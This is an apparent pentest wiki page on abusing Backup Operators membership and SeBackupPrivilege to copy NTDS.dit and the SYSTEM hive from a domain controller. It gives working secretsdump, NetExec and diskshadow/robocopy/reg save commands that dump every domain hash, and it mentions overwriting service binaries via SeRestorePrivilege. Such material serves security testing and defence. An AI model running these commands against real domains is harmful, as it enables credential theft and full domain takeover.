---
title: "Backup Operators: reading NTDS.dit with SeBackupPrivilege"
description: "Abusing membership of the Backup Operators group, which grants SeBackupPrivilege, to read files past their ACLs and extract NTDS.dit and the SYSTEM hive from a domain controller, yielding every domain hash."
keywords:
  - Backup Operators
  - SeBackupPrivilege
  - NTDS.dit
  - diskshadow
  - secretsdump
---

# Backup Operators

The **Backup Operators** group grants **`SeBackupPrivilege`** (and `SeRestorePrivilege`): the right to read (and write) any file regardless of its ACL, so backups can run. Applied to a domain controller, that right reads the one file that matters, **`NTDS.dit`**, plus the **SYSTEM** hive that decrypts it, handing you every account's hash. Membership of Backup Operators is therefore effectively Domain Admin, reachable without ever being in a privileged AD group.

## Extracting the domain database

`NTDS.dit` is locked while the DC runs, so you read it from a **shadow copy** (or via VSS remotely), using the backup privilege to bypass the ACL:

```bash
# Remote, from Linux: impacket uses the account's SeBackupPrivilege to VSS-snapshot and read NTDS
secretsdump.py -just-dc -use-vss 'EXAMPLE/backupop:password@<dc>'

# NetExec module automates the DiskShadow path (snapshot, robocopy /B, reg save, secretsdump)
nxc smb <dc> -u backupop -p password -M ntds_diskshadow
```

On-host (as a Backup Operators member), the manual path is a DiskShadow script that snapshots `C:`, `robocopy /B` the `NTDS.dit` off the snapshot, `reg save HKLM\SYSTEM system.hive`, then parse offline:

```text
diskshadow> set context persistent nowriters ; add volume C: alias cc ; create ; expose %cc% Z:
robocopy /B Z:\Windows\NTDS . NTDS.dit
reg save HKLM\SYSTEM system.hive
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

## Exploitation notes

- The result is the full [NTDS](../authentication/credentials/ntds-and-dcsync.md) dump: `krbtgt`, every user and computer hash, AES keys, so it is domain compromise, equivalent to DCSync but through the filesystem.
- `SeBackupPrivilege` also reads the **local SAM/SECURITY/SYSTEM** hives of any host for its local secrets, useful on member servers where the account is a local Backup Operator.
- `SeRestorePrivilege` is the write counterpart: overwrite protected files (service binaries, DLLs) for code execution where reading is not enough.
- Backup Operators can log on to DCs, so an on-host DiskShadow path is available when remote VSS is blocked.

## Tools

- **Impacket `secretsdump.py -use-vss`**: remote NTDS read via the backup privilege.
- **NetExec `-M ntds_diskshadow`**: automated DiskShadow NTDS dump over WinRM/SMB.
- **diskshadow + robocopy /B**: native on-host snapshot and backup-mode copy.

## References

- [NetExec wiki: dumping with Backup Operator privileges](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-backupop)
- [Hacking Articles: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [qazeer notes: operators to Domain Admins](https://notes.qazeer.io/active-directory/exploitation-operators_to_domain_admins)
